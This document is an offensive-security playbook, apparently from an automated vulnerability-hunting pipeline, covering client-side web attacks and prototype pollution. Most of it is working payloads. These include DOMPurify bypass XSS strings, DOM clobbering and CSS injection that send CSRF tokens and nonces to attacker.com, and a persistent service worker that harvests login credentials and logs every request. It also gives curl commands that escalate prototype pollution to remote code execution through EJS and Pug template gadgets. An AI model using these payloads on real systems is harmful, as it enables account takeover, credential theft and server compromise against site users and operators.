# ZDH Phase 24, 25: Browser-Side Client Attacks + Prototype Pollution

## Phase 24 - Browser-Side Client Attacks (Conference Research: DEF CON/Black Hat)

**These bypass all server-side WAFs and sanitizers. Target the client, not the server.**

### mXSS - Mutation XSS (DOMPurify Bypass)
```bash
# Check DOMPurify version in JS bundles
grep -r "DOMPurify" ./js_bundles/ | grep "version\|VERSION\|v[0-9]"
# Vulnerable: < 3.1.3

# MathML namespace confusion (bypasses DOMPurify < 3.1.3, CVE-2024-47875):
<math><mtext><table><mglyph><style><!--</style><img title="--></style><img src onerror=alert(1)>">

# noscript bypass (when app uses FORCE_BODY option):
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

# SVG namespace confusion (< 2.2.2):
<svg><p><style><!--</style><img title="--></style><img src onerror=alert(1)>">

# Confirm: does alert() fire despite sanitizer passing the input?
# If yes: full XSS = can read cookies, localStorage, make authenticated requests
```

### DOM Clobbering (IEEE S&P 2023)
```html
<!-- Find JS reading uninitialized globals: window.config, document.scriptURL, etc. -->
<!-- Inject HTML (not JS) to overwrite those globals: -->

<!-- Clobber window.config.scriptUrl to load attacker script -->
<a id=config><a id=config name=scriptUrl href=https://attacker.com/evil.js>

<!-- Two-level clobbering: window.x.y -->
<form name=x><input id=y value="https://attacker.com/evil.js"></form>

<!-- Service worker hijack via DOM clobbering (PortSwigger 2022) -->
<a id=scriptURL href=//attacker.com/sw.js></a>
<!-- navigator.serviceWorker.register(scriptURL) -> loads attacker's SW -->
```

### CSS Injection - CSRF Token Theft (Huli / corCTF 2022)
```css
/* Find: user input rendered inside <style> tag without JS execution */
/* Exfiltrate CSRF token char by char via attribute selectors + CSS url() */

/* Inject this CSS: */
input[name=csrf][value^=a]{background:url(https://attacker.com/?c=a)}
input[name=csrf][value^=b]{background:url(https://attacker.com/?c=b)}
/* ... all chars ... */

/* Chrome 105+ - use :has() for parent targeting: */
form:has(input[name=csrf][value^=a]){background:url(https://attacker.com/?c=a)}

/* Nonce exfiltration (CSP bypass): */
script[nonce^=a]{background:url(https://attacker.com/?n=a)}
/* Repeat for each position -> reconstruct full nonce -> bypass CSP -> XSS */
```

### Dangling Markup Injection (PortSwigger Research)
```html
<!-- Use when: HTML injection works but JS is blocked by CSP -->
<!-- Inject unclosed attribute that "eats" subsequent page content -->

<!-- If CSRF token appears below your injection point in HTML source: -->
<img src='https://attacker.com/collect?data=
<!-- Browser treats everything until next ' as part of src value -->
<!-- Server receives: GET /collect?data=...csrftoken=SECRET123...  -->

<!-- Meta refresh variant (causes navigation): -->
<meta http-equiv="refresh" content="0; url=https://attacker.com/?data=
<!-- Captures everything until closing ' as URL parameter -->
```

### Service Worker XSS Persistence
```javascript
// Via any XSS: install persistent service worker that survives page close
navigator.serviceWorker.register('https://attacker.com/evil-sw.js', {scope: '/'})

// evil-sw.js - intercepts ALL requests from that origin indefinitely:
self.addEventListener('fetch', event => {
  const req = event.request.clone();
  // Exfil every request URL + body + cookies
  req.text().then(body => fetch('https://attacker.com/log?url='
    + encodeURIComponent(req.url) + '&body=' + encodeURIComponent(body)));
  event.respondWith(fetch(event.request));
});

// Login form credential harvester:
self.addEventListener('fetch', event => {
  if (event.request.url.includes('/login')) {
    event.respondWith(event.request.clone().formData().then(data => {
      fetch('https://attacker.com/creds?u=' + data.get('username') + '&p=' + data.get('password'));
      return fetch(event.request);
    }));
  }
});
// Persist for weeks. Survives cache clear. Removed only by explicit unregister.
```

## Phase 25 - Prototype Pollution & Second-Order Injection (USENIX Security 2023)

### Prototype Pollution -> RCE
```bash
# Detect: fuzz any deep-merge endpoint (settings, preferences, profile update)
curl -X POST https://<target>/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"yes"}}'
# Then: GET /api/settings -> if "polluted":"yes" appears = PP confirmed

# Also try:
{"constructor":{"prototype":{"polluted":"yes"}}}

# Escalate to RCE via EJS template gadget (most common Node.js gadget):
curl -X POST https://<target>/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"x;require(\"child_process\").execSync(\"curl https://YOUR-INTERACTSH/?x=$(whoami)\")//"}}'
# Then trigger any page render that uses EJS

# Pug template gadget:
{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require('child_process').execSync('id')"}}}

# NODE_OPTIONS gadget (Node >= 19, PortSwigger 2023):
{"__proto__":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}
# Then trigger any child_process.spawn call
```

### Second-Order Injection
```bash
# Concept: inject payload in step 1, it's stored safely.
# Trigger: in step 2, stored data is used in a different (vulnerable) context.

# Example - SQLi stored in username, triggered in admin search:
# Step 1: Register with username = admin'-- (stored without immediate execution)
# Step 2: Admin searches for user -> username inserted into SQL without sanitization

# Example - SSTI stored in display name, triggered in email template:
# Step 1: Set display name = {{7*7}} (stored as text)
# Step 2: System sends welcome email using display name in template -> 49 in email

# Detection: test all stored fields with template injection probes
# {{7*7}}, ${7*7}, #{7*7}, *{7*7}
# Check ALL places where stored value is used: emails, reports, logs, admin views
# Not just where it's displayed to you - where it's processed by OTHERS
```

**Signal:** `emit_signal VULN_CONFIRMED "Prototype pollution RCE: <endpoint> -> EJS gadget -> code exec" "main/zerodayhunt" 0.96`
